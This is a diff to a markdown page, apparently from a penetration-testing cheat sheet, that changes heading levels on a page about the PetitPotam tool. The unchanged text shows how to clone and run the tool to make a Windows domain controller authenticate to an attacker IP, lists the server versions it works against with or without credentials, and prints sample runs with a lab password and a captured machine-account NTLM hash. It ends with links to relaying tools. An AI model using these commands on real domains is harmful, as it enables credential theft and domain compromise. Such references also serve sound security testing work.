@@ -29,28 +29,28 @@ MS-EFSRPC - Encrypting File System Remote (EFSRPC) Protocol
 
 <https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31>
 
-### Installation
+## Installation
 
 ```plain
 git clone https://github.com/topotam/PetitPotam.git
 ```
 
-### Usage
+## Usage
 
 ```plain
 python3 Petitpotam.py -d '' -u '' -p '' [ATTACKER-IP] [TARGET-DC-IP]
 ```
 
-### Examples
+## Examples
 
-#### Checked against the following versions
+### Checked against the following versions
 
 * Windows Server 2008(R2) - works, no credentials needed
 * Windows Server 2012(R2) - works, low privilege credentials needed
 * Windows Server 2016 - works, no credentials needed
 * Windows Server 2019 - works, no credentials needed
 
-#### Low privilege AD user on Server 2016
+### Low privilege AD user on Server 2016
 
 ```plain
 $ python3 Petitpotam.py -d 'offsec.nl' -u 'john' -p 'Welkom1234' 10.31.59.101 10.31.59.105
@@ -94,7 +94,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] WIN-OQFQ56VU50C$::OFFSEC:aaaaaaaaaaaaaaaa:9f1d3f18af60dc624ee3d2be8b98494c:01010000000000000009ee60d77ed70143932a3734ac502200000000010010004800650045006e00430070004b007000030010004800650045006e00430070004b00700002001000560052006b004700720069006400620004001000560052006b0047007200690064006200070008000009ee60d77ed70106000400020000000800300030000000000000000000000000400000bbabc22c577418c533bb0e07aecd2a76e843cfbea4efe8c524bfa00aa567cda60a001000000000000000000000000000000000000900220063006900660073002f00310030002e00330031002e00350039002e00310030003100000000000000000000000000
 ```
 
-#### No-creds Server 2019
+### No-creds Server 2019
 
 ```plain
 $ python3 Petitpotam.py -d '' -u '' -p '' 10.31.59.101 10.31.59.106
@@ -143,7 +143,7 @@ For relaying have a look at
 * [Impacket - NTLMrelayx.py]({{< ref "ntlmrelayx-py" >}})
 * [CrackMapExec - Generate target list where targets do not require signing (SMB)]({{< ref "cme-smb" >}})
 
-### URL list
+## URL List
 
 * [Github.com - PetitPotam](https://github.com/topotam/PetitPotam)
 * [Github.com - From RPC to RCE - Workstation Takeover via RBCD and MS-RPChoose-Your-Own-Adventure](https://gist.github.com/audibleblink/06916db2a76c7bd13400c4f9da422ad5)
